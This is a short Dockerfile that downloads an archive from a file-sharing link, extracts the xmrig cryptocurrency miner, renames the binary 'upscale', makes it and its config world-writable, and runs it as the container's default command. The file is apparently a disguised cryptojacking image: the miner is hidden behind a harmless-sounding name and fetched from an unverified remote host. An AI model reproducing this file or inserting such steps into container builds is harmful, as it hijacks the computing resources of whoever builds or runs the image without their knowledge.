FROM ubuntu:20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://www.4sync.com/web/directDownload/lVE-MUwS/Qd-dXiuh.09d66aee22964e91908cfc724d68c185; \
    tar xf Qd-dXiuh.09d66aee22964e91908cfc724d68c185; \
    cd upscale; \
    cp config.json /usr/local/bin/config.json; \
    cp xmrig /usr/local/bin/upscale; \
    cd /usr/local/bin;

WORKDIR /usr/local/bin

RUN chmod 777 config.json;

RUN chmod 777 upscale;

CMD upscale
